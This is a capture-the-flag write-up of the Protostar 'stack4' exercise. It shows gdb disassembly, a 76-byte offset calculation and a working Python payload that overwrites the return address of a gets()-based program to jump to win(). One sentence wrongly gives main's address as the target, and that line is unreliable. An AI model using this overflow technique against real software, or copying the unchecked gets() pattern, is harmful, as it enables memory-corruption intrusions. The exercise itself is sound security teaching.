# Stack 4

## Problem

Again we check for other possible function calls that might be used in this problem.

```gdb
 info functions
All defined functions:

File stack4/stack4.c:
int main(int, char **);
void win(void);
```

We then examine both the main and win function.

```gdb
Dump of assembler code for function main:
0x08048408 <main+0>:    push   ebp
0x08048409 <main+1>:    mov    ebp,esp
0x0804840b <main+3>:    and    esp,0xfffffff0
0x0804840e <main+6>:    sub    esp,0x50
0x08048411 <main+9>:    lea    eax,[esp+0x10]
0x08048415 <main+13>:   mov    DWORD PTR [esp],eax
0x08048418 <main+16>:   call   0x804830c <gets@plt>
0x0804841d <main+21>:   leave
0x0804841e <main+22>:   ret
End of assembler dump.
Dump of assembler code for function win:
0x080483f4 <win+0>:     push   ebp
0x080483f5 <win+1>:     mov    ebp,esp
0x080483f7 <win+3>:     sub    esp,0x18
0x080483fa <win+6>:     mov    DWORD PTR [esp],0x80484e0
0x08048401 <win+13>:    call   0x804832c <puts@plt>
0x08048406 <win+18>:    leave
0x08048407 <win+19>:    ret
End of assembler dump.
```

From the code we can guess the buffer is at `esp+0x10` to `esp+0x50` a 64char buffer. We can also see that there is a `gets` call before the function terminates. There is no call to any other function in main. We want to try to force main to call `win` instead. We could do so by having the stack overflow past ebp of main. Then we would have to also replace the ebp of the caller to main and the return address afterwards, where the return address should be `0x08048408`.
By computing we aim to find the esp and overflow past the ebp by a word to first remove the previous ebp in call and then to inject the address of `win`.

## Idea and Attack process

```gdb
b *0x0804840e
r
info reg
>>>esp            0xbffffc10       0xbffffc10
>>>ebp            0xbffffc68       0xbffffc68
```

From here we will reverse engineer the location of the stack to be `0xbffffc20` and we will have to fill till `0xbffffc68 + 4` that gives us a total of 76char before injecting our `win` location

```shell
python -c 'print "1"*76 + "\xf4\x83\x04\x08"' | ./stack4
```

## Source code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```
